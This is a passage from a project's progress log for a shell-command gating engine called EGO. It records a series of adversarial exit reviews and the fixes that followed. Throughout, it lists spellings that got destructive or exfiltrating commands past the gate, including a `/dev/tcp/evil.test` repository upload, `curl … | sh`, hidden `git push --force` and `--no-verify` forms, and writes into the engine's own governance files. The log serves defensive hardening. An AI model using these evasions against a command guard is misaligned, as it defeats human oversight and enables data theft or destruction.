     happens for every unit; isolation decides only whether shell state RESETS between units.
  2. **A subshell reduced DENY to ASK.** `( chmod 777 /etc/passwd )` kept its parentheses inside the segment, so
     the head was `(` and every `^`-anchored matcher missed. Subshell and brace-group delimiters at a command
     position are now consumed as the shell structure they are; `((` stays arithmetic, and a `)` closing nothing
     — a `case` pattern — stays literal. A `cd` inside a subshell no longer leaks to the caller: the splitter
     emits a restore marker, and the working directory stops being claimed after the subshell closes.
  Two proportionality corrections came with it: arithmetic expansion `$((…))` was read as a command substitution,
  so ordinary `echo $((i+1))` asked (only a substitution NESTED in the expression is a command); and
  `yarn|pnpm|bun|deno|npx|rake|sbt|bazel --version`, `pip list|show|freeze` and `python3 -m venv` had no matcher at
  all while `npm --version` was ALLOW. Ordinary development across seven ecosystems: 73 commands, 13 gated (18%),
  every one of them named with its reason in `EXPECTED_GATES`. Attack corpora unchanged at 200,334 commands /
  39 ALLOW. The frozen class list is `docs/architecture/phase-1-taxonomy.md`.
  **EXIT REVIEW 4 (2026-09-24), the first run under the third exit model — FAILED its own criterion, and that is
  the point.** Eight independent adversarial lenses, each reproducing every claim against the real evaluator through
  a shared probe; every non-proportionality claim then put to two independent skeptics instructed to REFUTE it.
  **59 of 60 refutation attempts failed** — the findings were real, and I reproduced each one cited below myself.
  **ZERO new architectural classes**: every confirmed finding is an instance of a class already frozen in
  `docs/architecture/phase-1-taxonomy.md` (segment structure, wrapper transparency, target classification,
  proportionality). The taxonomy held; the implementation did not.

  **Three of the severe findings were regressions introduced by commit c88902b, in this session.** The arithmetic
  branch was the worst defect of the whole phase: `$((cmd) )` and `$((cmd); true)` are COMMAND SUBSTITUTIONS in
  bash, zsh and dash — verified against real shells, they run the command — and reading every `$((` as arithmetic
  erased the command from the segment list entirely, so EVERY deny in the control plane was reachable at ALLOW,
  at any producer depth. A shell resolves the same ambiguity by requiring the span to close with `))`; the splitter
  now does too. Also mine: `( cd docs && ls )` asked because the cwd-restore marker was classified as a command,
  and a group's trailing redirection was orphaned into a headless segment.

  **Pre-existing floor crossings closed in the same pass.** A `#` comment was not recognised by the splitter, so an
  apostrophe in one — `echo hi  # isn't ready` — put the scanner into a phantom quoted state and swallowed every
  following line of a multi-line command. In `scriptSegments`, a `<<` ANYWHERE on a line opened a heredoc, so
  `cat <<< ready`, `grep -rn "<<<<<<< HEAD" .`, `echo "shift << Bits"` and `echo $((1<<BITS))` each made the whole
  REST of a script, hook or recipe invisible; an unterminated heredoc now reports opacity instead of a short list.
  A `case` branch kept its pattern glued to the command, a function definition kept its header glued to the body,
  `2>&1` and `>&2` were split on the `&` (and `>&FILE` lost its target), a backslash continuation inside a script
  body was cut in two, `exec -c -a NAME prog` hid the program behind the alias, `/bin/sh -c '…'` was read as a
  script path instead of an interpreter, a `-c` anywhere in `bash script.sh -c x` hijacked the interpreter,
  `trap 'CMD' EXIT` and `sh <<< 'CMD'` were unmodelled carriers, docker's global options displaced the subcommand
  so `docker --tls exec` reached ALLOW, docker's `image` management group was treated as a read verb so
  `docker --context production image rm|prune|load` reached ALLOW, and the engine's local test was a SUBSTRING
  match so `tcp://[fd00:acme:prod::1]:2375` was the local daemon.

  **Proportionality was the other half of the report, and it mattered more than usual**, because splitting script
  bodies correctly means every line of every script is now classified: `dirname`, `basename`, `mktemp`, `nproc`,
  `[`, `exit`, `sleep`, `seq`, `test`, `command -v NAME`, `popd >/dev/null`, `while … done < list.txt`, and every
  `VAR=$(cmd)` or `n=$((i+1))` binding asked. A name binding is now proven to execute nothing — except when the
  name IS execution, where a standalone `PATH=` or `LD_PRELOAD=` gets the same verdict as the same binding in
  front of a command, which it did not before.

  Measured before and after over a probe corpus: **18 verdicts moved, 4 stronger and 14 weaker, and every weaker
  one is provably closure-free shell structure** (`echo $((1+2))`, `( ls )`, `{ ls; }`, `build() { ls; }`,
  `while read … done < f`, `if [ -f x ]; then ls; fi`). Attack corpora unchanged at 200,334 commands / 39 ALLOW.
  What the review did NOT close is recorded in `docs/architecture/phase-1-residuals.md`; this line therefore stays
  IN PROGRESS, and Phase 1 is NOT closed.

  **A parallel-test failure was found while validating this pass, FIRST DIAGNOSED WRONGLY HERE, and then closed.**
  It was recorded as "several test processes materialising the same content-derived source identity at once". That
  is not the mechanism and it needs no concurrency: `selfIdentity()` caches the identity for the life of a process,
  the identity covers `docs/**` and `control-plane/**` — which this repository's own process edits every phase —
  and `initProject` wrote the PIN and then called an unguarded `materializeRuntime` that throws when the tree has
  moved. Every later `ego init` in that process left the project PINNED AND UNGOVERNED, which is the "8 of 19"
  suffix. Reproduced in a single process with one write. Closed with it: `materializeRuntime` now hashes the COPY
  rather than verifying the live tree and copying afterwards (which silently produced cache entries whose bytes
  hash to something other than their name, later reported as TAMPERED), losing a placement race is success rather
  than ENOTEMPTY, and `selfVersion()` is memoized instead of shelling out to git on each of its twelve call sites.
  Measured after the fix: the same deliberate provocation goes from 8 failures to 1, and the remaining one is a
  trust assertion reading an identity that genuinely moved. Full detail in docs/architecture/phase-1-residuals.md.
  **EXIT REVIEW 6 (2026-09-24) — FAILED, with ZERO new architectural classes.** Eight independent high-risk
  lenses against HEAD eab9a57, every claim reproduced through a shared probe and put to two skeptics instructed to
  refute it. The taxonomy held completely: no lens produced a shape of execution closure the eleven frozen classes
  cannot express, including the lens whose whole job was to try. What it did produce was a long list of
  unauthorized ALLOWs inside those classes, and the most valuable of them are the ones nobody had thought to spell:

  - **PS4 is an execution carrier.** bash RE-EXPANDS `PS4` before printing every traced command, so
    `PS4='$(git push origin main)' bash -x script` runs the push once per traced line — at ALLOW, because the
    normalizer strips a leading assignment and only re-surfaces names it recognises.
  - **An enumeration of program-valued git config keys is an allowlist, and everything off it reached ALLOW.**
    `diff.external`, `merge.<d>.driver`, `gpg.program`, `trailer.<t>.command`, `credential.helper`. The rule is now
    the SHAPE of the key — git's own convention is that a program-valued key ends in `command`, `driver`,
    `program`, `helper`, `textconv`, `clean`, `smudge`, `external` and their siblings.
  - **`post-index-change` fires on `git status`.** The verb-to-event table had no entry for the read commands that
    refresh the index, so a hook installed there was never resolved and `git status` stayed ALLOW.
  - **make's own shapes.** A conditional at column 0 inside a recipe ended the rule, dropping every guarded line;
    `.DEFAULT`, an old-style suffix rule and an ordinary target simply NAMED `.deploy` were all skipped as
    "special", so EGO proved absent a target make runs a recipe for.
  - **A client config directory selects the engine** (`docker --config DIR`, `podman --remote`), **a context
    CREATE writes the name-to-engine binding**, and **a URI query parameter overrides the URI host**
    (`postgres://localhost/app?host=prod-db`).
  - **Reading a production cluster's secrets is an act against it**, not a read the target model may wave through:
    `kubectl --context production get secrets -o yaml` was ALLOW under a capability named `k8s.local.apply`.
  - Also closed: `export FOO=bar BASH_ENV=…` (a governed binding is recognised wherever it sits on the line),
    `npm run X --userconfig=FILE`, `git stash --all` (which stashes the whole `.harness` tree), `git send-pack`
    and `git subtree push` as spellings of a push, and `less +'!CMD'` as an initial-command carrier.

  One of the review's own claims was REFUTED by the work: `mongosh --eval '<js>'` is not "a program EGO never
  read" — the code is inline and visible — and the rule written for it was reverted because it hid the target
  resolution and dropped a PRODUCTION mongo target from DENY to ASK. That is recorded because a review finding
  that turns out to be wrong is as much a result as one that turns out to be right.

  After the fixes there is no ALLOW left in the review's reproduction set: what remains is ASK, which is the
  designed gate. This line stays IN PROGRESS: the criterion is a FRESH review finding none, and the review that
  found these is not that review.

  **CLOSING EXIT REVIEW 6 (2026-09-24, commit d6375f8) — ten floor crossings, seven root causes, three more found
  by the corpus itself.** The remaining eight constats were all DENY-arriving-as-ASK, none an unauthorized ALLOW.
  They were fixed by CAUSE rather than by spelling, and the general statement in each case is the same shape:
  *a positive conclusion was drawn at the wrong position in the command.*

  - **An option's VALUE is not an operand.** The scan for `-c` stepped over `-o pipefail` and `-O extglob` as
    though they were the program, so `bash -o pipefail -c 'git push origin main'` lost its inline script.
  - **A `#` comment starts at a WORD boundary**, which an unquoted operator makes as surely as a space does:
    `echo hi;# it's fine` put the scanner into a phantom quoted state through the apostrophe.
  - **`source` and `.` RUN the file they are handed**, so `. <(echo CMD)` is the same execution edge as
    `bash <(echo CMD)`; the gate listed only the interpreters.
  - **`<&0` DUPLICATES the descriptor the pipe installed**; only a redirection from a FILE replaces it, and
    reading the duplication as a replacement killed the pipe edge in `echo 'rm -rf /' | bash <&0`.
  - **Target sensitivity belongs to the TOOL, not to the capability that won the first match.** `docker exec`
    is classified script-opaque — an interactive shell IS opaque — and that capability is not enrolled in the
    target model, so a shell on a production engine asked while `docker run` against the same engine was denied.
  - **A privilege wrapper's tail is a command**, and re-joining its tokens erased the quoting that says where a
    word ends: `sudo bash -c 'git push origin main'` became `bash -c git push origin main`, whose program is the
    single token `git`.
  - **`printf %b` numeric escapes are text.** `\xHH` and `\0NNN` are decoded and masked to a byte the way the
    shell masks them, so a literal asserted from an emitter is the text that will actually run.

  The generated cross-product then found three more while proving the fixes, which is what it is for:

  - the container engine was enrolled in the target RESOLVER but not in the target-ENVIRONMENT re-attachment, so
    an engine named by `DOCKER_HOST`/`DOCKER_CONTEXT` survived only while the assignment stayed leading;
  - the resolver read that re-attachment from `envInputs` only and never as a token — the "accepted but
    unconsumed" defect one layer down;
  - the normalizer stripped the environment prefix ONCE, *before* the shell keywords, so `if VAR=… cmd` kept its
    assignment at the head and matched no `^`-anchored matcher at all.

  Each of the ten is now a permanent corpus transform or class case, so every one is tested against every class
  and every class against every one. Two corpus transforms were themselves corrected rather than the kernel: a
  `nohup VAR=x cmd` composition is not a command any shell runs (the wrapper is handed `VAR=x` as its program),
  and `chmod\040777` is `\0407` — a BEL, not a space — because `\0ddd` takes up to three octal digits. Gating a
  command the shell would refuse to run is not a safety property.

  **Cold validation at d6375f8** (`~/.ego` removed first): typecheck PASSED, lint PASSED, **FIRST cold parallel
  run 234/234**, serial run 234/234, metamorphic/property suite 8/8, attack corpora 200,334 commands → 40 ALLOW
  (the identical known set: three `@HOME@` placeholders the fixtures never expand, and ordinary development
  commands the attack files carry as decoys), proportionality 7/44 (16%) and 13/73 (18%) — both unchanged.
  **EXIT REVIEW 7 (2026-09-24, HEAD 203ba67) — FAILED. 24 adversarial lenses, 730 agents, 45M subagent tokens.**
  `pass: false`. 157 findings survived three independent refuters each (one of which had to RE-RUN the command
  through the evaluator): **37 CRITICAL and 56 HIGH unauthorized ALLOW**, 17 lower-severity ALLOW, 8 floor
  crossings and 39 proportionality defects. **`newClasses: 0`** — the seventh consecutive review to produce no
  architectural class the frozen eleven cannot express.

  TWO THINGS ABOUT THAT NUMBER ARE RECORDED HONESTLY. First, 100 of the 730 agents FAILED on the account's weekly
  usage limit, all of them in the Classify phase, so `newClasses: 0` covers the findings whose classification
  completed and not the whole set; the class list was not fully re-tested by this review. Second, this review was
  three times the size of review 6 and its verifiers executed every claim, which is why it found what six earlier
  reviews did not. A bigger instrument is not a regression in the artifact; it is a measurement of how far the
  previous instruments reached.

  The CRITICAL and HIGH findings were closed by ROOT CAUSE, not by spelling. The ones that say something general:

  - **A STATE MARKER MUST BE UNFORGEABLE.** The analyzer injects markers into the segment stream and the control
    plane matches them with ordinary regexes. They were plain words, so a COMMAND could spell one:
    `define-function git; git push origin main` made the analyzer believe `git` was a locally defined function
    whose body it had already read, and the real push was classified read-only — ALLOW. The same forgery reached
    `psql`, `aws`, `terraform`, `vault` and `argocd`, i.e. through absolute core denies. Two locks now: every
    marker carries a NUL-delimited sentinel, and every byte entering the analyzer from outside has that sentinel
    mangled out.
  - **`$'…'` IS AN ANSI-C STRING, and a backslash escapes inside it.** Read as an ordinary single-quoted string,
    `echo $'\''` left the splitter believing it was inside a quote for the rest of the line; everything after it
    collapsed into one `echo`-headed segment, so every DENY spelled after it was ALLOW — the trust store,
    `curl … | sh`, a production database.
  - **THE COMMENT RULE HAD A SIBLING READER, AND THE FIX LANDED AT ONE OF THEM.** Exit review 6 widened the
    splitter's word boundary and left `stripComment` on the narrow whitespace test, so `echo a;#<<true` in a
    script or a hook opened a phantom heredoc that swallowed the next line. In `.git/hooks/pre-commit` that turns
    an ordinary `git commit` into a remote push. This is the meta-defect this repository has met before.
  - **`/dev/tcp/HOST/PORT` IS NOT A FILE.** bash intercepts the pathname in its own redirection code and calls
    connect(2), so `tar czf - . > /dev/tcp/evil.test/443` ships the whole repository — `.git` and `.env` included
    — with no network binary anywhere on the line, and the analyzer discarded the target as a device sink.
  - **A DEVICE IS A PROPERTY OF THE RESOLVED PATH.** `/dev/../Users/me/.zshrc` is a home file; a nine-character
    prefix had been turning an absolute deny into ALLOW for any path on the machine.
  - **A DESTINATION NAMED BY A FLAG IS A DESTINATION.** Every bundler's own output flag was unread, so
    `esbuild --outfile=.git/hooks/pre-commit` installed a hook, `--outfile=control-plane/permissions/matchers.md`
    rewrote the policy that decides every later verdict, and `vite --outDir .harness/runtime` wrote runtime state
    the kernel alone may write.
  - **GIT'S PATHSPEC NEEDS NO `--`.** `git checkout HEAD~1 control-plane/…` and `git checkout origin/evil
    .harness` were ALLOW while the identical act with two extra characters was an absolute deny.
  - **A GUARD THAT TESTS THE HEAD MUST RE-RUN AFTER THE HEAD CHANGES.** One wrapper hid the npx acquisition
    guard: `env npx --package=evil -c "tsc --version"` fetched and ran an arbitrary package while the kernel
    classified the decoy.
  - **A PRODUCER'S ARGUMENTS ARE PART OF ITS COMMAND.** npm appends what follows `--` to the script body, so
    `npm run build -- deploy` really runs `make build deploy`; only the manifest string was resolved.
  - **THE ENVIRONMENT IS FOUND WHERE THE COMMAND STARTS.** `export PGHOST=prod-db… && psql -c 'DROP TABLE users'`
    was ALLOW while the one-segment spelling was an absolute deny, because the target-selecting names were absent
    from the execution-environment vocabulary and the database resolver was the one resolver that did not read
    the environment at all.
  - **THE TARGET IS A PROPERTY OF THE TOOL,** in three more forms: a capability not enrolled cannot be
    re-targeted, an engine bound by `podman system connection` or `docker buildx create --driver remote` is an
    engine, and a signal's target is a VALUE rather than a suffix (`docker --context staging-run run` lost its
    own verb).

  **PROPORTIONALITY WAS A THIRD OF THE REVIEW, and is treated as the same seriousness.** `cp /tmp/foo.txt .` was
  an absolute core deny because the current directory contains `.harness`; `rm -rf node_modules` was refused
  outright because `node_modules/.bin` sits below it; `grep -rn 'NODE_OPTIONS=' .` — reading your own repository
  for the name of a variable — was refused because a binding is matched anywhere on the line. The statements:
  writing ONE named file into the repository root is not a write of its protected subtrees, a DELETE is not a
  write into (except of EGO's own governance tree, which stays denied), a search pattern is data, and a value
  that cannot name a program does not change what runs.

  **VALIDATION AT HEAD 7e08564, FROM A COLD STATE** (`~/.ego` removed first): typecheck PASSED, lint PASSED,
  FIRST cold parallel run 234/234, serial run 234/234, metamorphic/property suite 8/8, proportionality 13/73
  (18%, unchanged — the 13 are the accepted UNKNOWN_PRODUCER task runners). The in-repo cross-product now asserts
  **11,645** (class, spelling, transformation, producer) combinations, up from 4,395: 34 root semantic classes,
  121 canonical spellings, 87 transformations, 1,222 producer-carried variants and 98 ordinary commands.

  **THE 200,334-COMMAND ATTACK CORPORA COULD NOT BE RE-RUN AT THIS HEAD, and that is itself a finding.** Those
  files lived in a session temporary directory, which has since been cleaned; the harness and its inputs are
  gone. A validation gate that lives in `/tmp` is not a gate. The permanent replacement is the in-repo
  cross-product above, which is generated rather than accumulated and grows by one line per transformation.

  **EVERY FINDING OF EXIT REVIEW 7 IS NOW RESOLVED** (HEAD c1ba97d). The six floor crossings that outlived the
  first pass were closed by cause, and three of them were ONE cause: the resolver keeps tool heads in code and
  the control plane keeps head alternations in `matchers.md`, and the two lists drifted — `oc`, `mysqladmin` and
  the two-word `clickhouse client` were in the resolver and in neither matcher, so no capability matched, the
  re-targeting had nothing to act on, and the command fell through to `command.unknown`. That is fixed as a
  PROPERTY rather than as three lines — *every tool the target model knows reaches the target model* — and the
  property immediately found a seventh instance of itself, `nerdctl`. The other three: a SERVICE-SCOPED endpoint
  variable is evidence about THAT service (`AWS_ENDPOINT_URL_S3` says nothing about IAM, and the unscoped
  `AWS_ENDPOINT_URL` still covers everything, which is what LocalStack does); a GROUP writes the CONCATENATION of
  what its commands write, so the upstream of a pipe fed by one is the whole group; and the `flock` carrier had
  no matcher of its own.

  **Final cold validation at HEAD c1ba97d** (`~/.ego` removed first): typecheck PASSED, lint PASSED, FIRST cold
  parallel run 235/235, serial run 235/235, metamorphic/property suite 5/5 including the new tool-reachability
  property, proportionality 13/73 (18%, unchanged), release build reproduced. The in-repo cross-product asserts
  **12,887** combinations across **37** root semantic classes, 132 canonical spellings, 89 transformations, 1,333
  producer-carried variants and 98 ordinary commands.

  **A SECOND PASS THEN SWEPT ALL 157 FINDINGS, and found that the first pass had verified only the ones whose
  effect is on the COMMAND LINE.** Thirteen more — the ones whose effect lives in a workspace FILE — had never
  been reproduced at all. Every one reproduced, and every one is now closed: eight make shapes the parser could
  not see (`X != CMD` running while make parses; a rule line indented with SPACES, since only a TAB marks a
  recipe; `.PHONY-thing` matching `.PHONY` through a `\b`; a WILDCARD include; an included makefile the same
  makefile REMAKES, which makes what EGO read a pre-image; a target-specific rebind on a `::` rule; a PATH entry
  judged before `/usr/..` was resolved away; and an IMPLICIT `%.o: %.c` rule, now RESOLVED rather than reported
  blind), a whole producer (**a Dockerfile is a producer** — `docker build .` executes every `RUN` line as root
  with the whole context copied in), and git's content filters (a clean filter runs on `git status` and
  `git diff` too, and the test for an included config file is WHO PULLS IT IN rather than where it sits).

  The sweep of the remaining self-contained findings closed nine more, including two instances of a lesson this
  phase has now met four times: `join(' ')` used where `requote` was needed, because the quoting is what says
  where a word ends.

  **Three findings stay at ASK deliberately**, recorded with their reasons in `phase-1-residuals.md`: a password
  handed on a command line, `git revert`, and `rm -rf node_modules`. None is an unauthorized ALLOW; each is the
  designed human gate, and for `git revert` the stricter verdict was tried and was disproportionate.

  **Final cold validation at HEAD 2fcd3bc**: typecheck PASSED, lint PASSED, FIRST cold parallel run 235/235,
  serial run 235/235, proportionality 13/73 (18%, unchanged). The in-repo cross-product asserts **14,400**
  combinations across **41** root semantic classes, 146 canonical spellings, 89 transformations, 1,793
  producer-carried variants and 98 ordinary commands — more than three times the 4,395 it asserted when exit
  review 7 began.

  **PHASE 1 IS STILL NOT CLOSED.** Nothing from this review is open, but the exit criterion is a FRESH review
  finding none — and the review that found these is not that review. `INDEPENDENT-AGENT REVIEW` stays IN
  PROGRESS.

  **EXIT REVIEW 8 (2026-09-28, HEAD 2fcd3bc) — FAILED. 28 adversarial lenses, 830 agents, 60M subagent tokens,
  ZERO agent errors.** 187 findings, 186 unique; 60 CRITICAL and 54 HIGH by the reviewer's own severity;
  **newClasses: 0 — the ninth consecutive review to add no architectural class, and the first with COMPLETE
  classification** (review 7 lost 100 agents to a weekly account limit, which was recorded at the time).

  The headline finding is a shell fact, not a policy one: **the shell deletes a backslash-newline before it
  parses anything.** `do\<newline>cker run … amazon/aws-cli s3 rm s3://prod-assets --recursive` runs docker;
  EGO read the head as `do`, a shell keyword its read-only matcher allows, and the line was ALLOW. Verified
  against bash, zsh and dash. The same pass established on this machine that macOS folds `ſ` to `s`, so
  `.harnesſ/runtime/pin.json` IS EGO's own runtime directory — paths are now compared on the FOLDED name.

  **EVERY UNAUTHORIZED ALLOW OF EXIT REVIEW 8 IS CLOSED** (HEAD 161c610, 60 local commits). What the sweep of all
  186 unique findings reports at this HEAD: **0 unauthorized ALLOW, 0 over-gated DENY, 45 rows still below the
  reviewer's floor** — 19 of them DENY-arriving-as-ASK, which is the designed human gate, and 26 of them
  proportionality rows where EGO asks about something the reviewer would allow. The three CRITICAL/HIGH rows that
  remain are an unclassified kubeconfig context (`make deploy`) and `git merge FETCH_HEAD`.
  *(Correction, 2026-10-07: "closed" above is a measurement at HEAD 161c610, not a property that held afterwards. The
  closure audit of 2026-10-01 found r8-39 — the fourth spelling of the function-binding finding, `git() { echo hi; }
  | cat`, newline, `git push origin main` — ALLOW again on `c54d8b2`; it is DENY since `0111e63`, and on the closure
  tree all 131 review-8 rows are CLOSED by replay (`docs/architecture/phase-1-findings-register.md`). A row is held
  closed by the test that pins it, and the register's pin column says which rows have one.)*

  **THE LAST BATCH WAS A CLASS OF ITS OWN, AND IT RUNS THE OTHER WAY: LOOKING AT SOMETHING IS NOT DOING IT.**
  Ten commands arrived as an ABSOLUTE DENY, which is the one verdict a human cannot approve — so EGO was refusing
  the INSPECTION an operator performs before deciding, while the act itself stayed reachable by other spellings.
  `git config core.hooksPath` reads the value; `make -n deploy` prints the recipe; `sed -n '1p'
  .claude/settings.json` prints one line; `psql -h /tmp` is the local unix SOCKET DIRECTORY; `influx -host
  localhost` is a Go-style LONG option, not `-h ost`, a host named "ost"; `aws s3 cp s3://fixtures/x .` is a
  DOWNLOAD; `cp README.md ..` writes into a directory that "contains" `.harness` only because it contains the
  checkout. A false positive of this shape is worse than a merely noisy one: it removes the gate instead of
  raising it.

  The mirror of that class closed with it. `command.script-opaque` means "something ran that I did not read", and
  it ASKS — correctly, for text nobody can read. Four commands carried their command as PLAIN TEXT in an option's
  value and still arrived there: sed's `e` command, git's `-O<pager>`, a Dockerfile on standard input in a
  HEREDOC, and `--pathspec-from-file`. Each now hands its text back to the canonical analyzer as its own segment;
  the call-site count in the producer contract goes 8 -> 10 with the reasons written down, and the streams that
  genuinely cannot be read stay opacity. The in-repo cross-product then found what two passes of mine had missed:
  a carrier anchored at token 0 sees neither `sudo git …` nor `FOO=bar sed …`, and a single-command `bash -c "…"`
  body was never re-entered, so the quoting that makes an awk program ONE WORD was already gone when the carrier
  read it.

  Also closed in this review: `$'…'` ANSI-C strings; `/dev/tcp` as a socket and `/dev/..` as an escape; a
  definition inside a branch the shell may never take binding nothing; a Dockerfile as a producer in nine more
  shapes (`# escape=`, `RUN <<EOF`, `SHELL [...]`, `ONBUILD`); nine make shapes (`?=`, every branch of a
  conditional as a candidate value, `define`/`endef`, target variables inherited by prerequisites, a cycle key
  that ignored command-line assignments); a reached search cap returning PARTIAL rather than ABSENT_VERIFIED; a
  cloud CLI run as a container image; awk's `system()`/`print |`/`getline`; a database client's standard input,
  which is SQL and not shell, and which can re-target the session with a `\c` before it does anything else;
  `zip -m`, which DELETES every source it archives; a `--mount type=volume` with `volume-opt=device=/…,o=bind`,
  which is a bind mount wearing another word; and nerdctl, named by the privileged-mount MATCHER but never
  reaching the resolver that judges the source.

  **THE 200,334-COMMAND ATTACK CORPORA ARE GONE** — they lived in a session temp directory that has since been
  cleaned. The in-repo generated cross-product is their permanent replacement and is now three times the size it
  was when this review began: **17,400** combinations across **45** root semantic classes, 164 canonical
  spellings, 95 transformations, 2,500 producer-carried variants and 103 ordinary commands. The proportionality
  probe that also lived in `/tmp` is redundant: `corpus.test.ts` enforces the same property in the repository,
  and every gated ordinary command is named with its reason in `EXPECTED_GATES`.

  **PHASE 1 IS STILL NOT CLOSED.** Nothing from this review is open, but the exit criterion is a FRESH review
  finding none, and the review that found these is not that review. `INDEPENDENT-AGENT REVIEW` stays IN PROGRESS.

  **EXIT REVIEW 9 (2026-09-29, HEAD 5fa3702) — FAILED. 26 adversarial lenses, 205 agents, 15.3M subagent tokens,
  ZERO agent errors.** 86 findings survived independent refutation: **62 unauthorized ALLOW** (23 CRITICAL, 31
  HIGH) and 24 OVER-GATED DENY. **newClasses: 0 — the tenth consecutive review to add no architectural class.**
  One lens came back clean; the other twenty-five did not.

  The headline finding is the same SHAPE as review 8's, one layer further down: **the shell expands braces before
  it expands anything else, and unconditionally.** `.harnes{s..s}/runtime/decisions/d1.json` IS
  `.harness/runtime/decisions/d1.json` — one word, in every shell, whether or not the file exists. Nothing in the
  kernel performed the expansion, so every literal reader below was handed a word that will never exist: a write
  to EGO's OWN decision records reached ALLOW, and so did `git commit -m x --no-verif{y..y}`, which bypasses the
  hook mechanism EGO's governance rides on. The fix is not asserted to be correct: a property test hands EGO's
  expansion BACK to `/bin/zsh` and checks it produces what the shell produces from the original word, over 29
  words covering lists, ranges, descending ranges, zero padding, nesting, cartesian products, unmatched braces,
  quoted braces and escaped braces.

  **THE OTHER HALF OF THE REVIEW RAN THE OTHER WAY.** 24 findings were an ABSOLUTE DENY over an act that changes
  nothing — `make -q`, `bash -n`, `git push --dry-run`, `kubectl auth can-i`, `terraform -help apply`, `gcloud …
  --filter=name:delete` (the word `delete` inside an OPTION VALUE), `cp .harness/runtime/state.json /tmp/` (a
  READ), and `grep -rn "decision answer" docs/`, which is reading the documentation that describes EGO's own
  subcommands. A DENY is the one verdict a human cannot approve, so a false positive of that shape does not raise
  the gate: it removes it.

  **THEN THE FIXES THEMSELVES WERE ATTACKED, AND FIFTY MORE DEFECTS CAME OUT** — 41 unauthorized ALLOW, 12
  CRITICAL, from NINE lenses of which none came back clean. All of them were mine, all written in the preceding
  hours, and the pattern is the uncomfortable one: **every exception added to let an operator LOOK is a spelling
  that can hide the ACT.** `--dry-run=none` is the explicit "really do it" value — helm's own help says it
  executes and persists. `EXPLAIN ANALYSE` executes what it wraps, and PostgreSQL accepts the British spelling as
  an exact synonym my word-bounded blocklist did not know; `show dbs; db.dropDatabase()` put the write after a
  reader, where only the first statement was inspected, and `\b` never matches inside `dropDatabase`. `ln -s
  ../.harness k` with `k` an existing DIRECTORY creates the link INSIDE it — ln's second documented form —
  reopening the route into the governance tree one spelling over. `make -q` runs no recipes but still PARSES, so
  `X := $(shell git push --force origin main)` runs at parse time, verified against GNU make 3.81.

  Three mistakes in the fixing itself were caught within minutes of writing them, each by a test: a `!== null`
  comparison on a function returning a BOOLEAN (always true); a `for` without braces that put the condition
  outside the loop; and a psql metacommand spelled as a PREFIX with an optional backslash, so `db.dropDatabase()`
  matched as `\d` — the single worst thing a production database client can be told to do, read as a schema
  listing. A generalisation was tried and refuted the same way: re-entering EVERY carried body makes a duplicate
  hit change the decisive capability and defeats the LOCAL de-escalation, and nine tests said so at once.

  **ONE GENERAL DEFECT CAME OUT OF THE PASS, and it is worth more than the instances: AN OPACITY MUST NEVER
  REPLACE A STRONGER VERDICT.** A producer marked STALE returned a null body, so a script or makefile whose
  contents are an absolute deny arrived approvable the moment ANY earlier segment of the same command line could
  not be classified — which the wildcard freshness entry makes easy. What was read is now handed over and the
  staleness recorded as a gap, which is the rule the make producer's own partial-expansion path already followed.
  And staleness is consulted BEFORE absence, because absence is itself a positive claim.

  **EVERY FINDING OF BOTH PASSES IS CLOSED OR REFUTED** (11 local commits). Four stand refuted by settled
  decisions, each pinned by a test that failed when the change was attempted: renaming a LOCAL branch, merging a
  NAMED branch, `helm get values` against production being a credential dump (exit review 7), and `rsync` into
  `.git/hooks` keeping its `fs.git-internals.write` classification.

  The in-repo cross-product now asserts **23,924** combinations across **67** root semantic classes, 218
  canonical spellings, 97 transformations, 3,721 producer-carried variants and 103 ordinary commands — up from
  17,400 when this review began, and from 11,645 when the corpora that could not be re-run were lost.

  **PHASE 1 IS STILL NOT CLOSED.** The exit criterion is a FRESH review finding none, and neither the review that
  found these nor the pass that attacked its own fixes is that review. `INDEPENDENT-AGENT REVIEW` stays IN
  PROGRESS.
  **EXIT REVIEW 10 (2026-09-29/30, HEAD 339c76b) — FAILED. 28 adversarial lenses.** 179 findings survived
  independent refutation: **100 unauthorized ALLOW** (35 CRITICAL, 49 HIGH, 15 MEDIUM, 1 LOW) and **79
  OVER-GATED DENY** (1 CRITICAL, 31 HIGH, 42 MEDIUM, 5 LOW). **newClasses: 0 — the eleventh consecutive review to
  add no architectural class.** By class: 77 proportionality, 29 target classification, 24 path classification, 13
  producer resolution, 10 segment structure, 10 verified environment, 8 provenance, 3 wrapper transparency, 2
  positive claims, 2 policy layering, 1 ambient closure.

  The unauthorized ALLOWs came from three moves. **The working directory a line runs in is whatever the earlier
  segments left, and EGO believed the text:** `cd sub && cd - && tee control-plane/…`, `pushd`/`popd`, a `cd` in a
  background job, a pipeline stage, an `if`, a `case` arm or a function body all moved the tracked directory for the
  rest of the line, so a governed path was resolved under `sub/` where no rule matches it (one lens, nine
  findings). **A parser and a shell read different words:** `--no{\-,\-}verify`, `{"--no-verify","--no-verify"}`,
  `.[h]arness/…`, `~+/control-plane/…`, a no-break space, `-fprog.awk`, `-C dir` behind `flock -c`. **A configuration
  file or an environment variable names a program:** `XDG_CONFIG_HOME`, `LD_AUDIT`, `PERL5LIB`, `CARGO_TARGET_*_LINKER`,
  `clang @opts.rsp`, `.cargo/config.toml`, `[core] fsmonitor` in an included file.

  The other half ran the other way, and it was the larger: **77 findings were an absolute DENY over an act that
  changes nothing**, and thirty of them share ONE cause — `git push --help`, `gh pr create --help`, `docker login
  --help`, `aws iam delete-user --help` were unapprovable, because the help flag was tested as an option rather than
  as a claim about the whole line. Fixed as a claim: `--help` grants the exception only when it is the last word,
  is not the value of an option, no `--` precedes it, the verb does not carry its arguments to a container, and it
  was written unquoted. The mirror was pinned in the same breath — `helm uninstall help`, `--description --help`,
  `--field-manager --help` and `annotate 'note=see --help'` are objects and values, and stay DENY.

  **THEN THE FIXES WERE PUT INTO THE CORPUS, AND THE CORPUS FOUND ELEVEN MORE THE REVIEW HAD NOT.** Freezing 24 new
  root classes (95 canonical spellings, 10,060 generated variants) with REAL newlines — the sweep that replays
  findings feeds a multi-line case as one line with a literal backslash-n, and had reported the `case` row as ASK
  when it was ALLOW — surfaced, in order of severity: a `cd` written `'cd'`, `c\d`, `c""d`, `builtin cd` or
  `command cd` was not a directory change at all, because the tracker and five splitter sites tested the text `cd`
  (a write to the governance tree after it was ALLOW); a `cd` inside a `case` arm was unconditional, because the
  splitter consumes the header and leaves no keyword to count; the `)` that ends a `case` pattern closed a `$( )`
  early, so `echo "$(case x in y) git push origin main ;; esac)"` read the push as text (ALLOW); `run: V = 1; git
  push --force origin main` — the value of a target-specific variable was cut at its `;`, which dropped the tail that
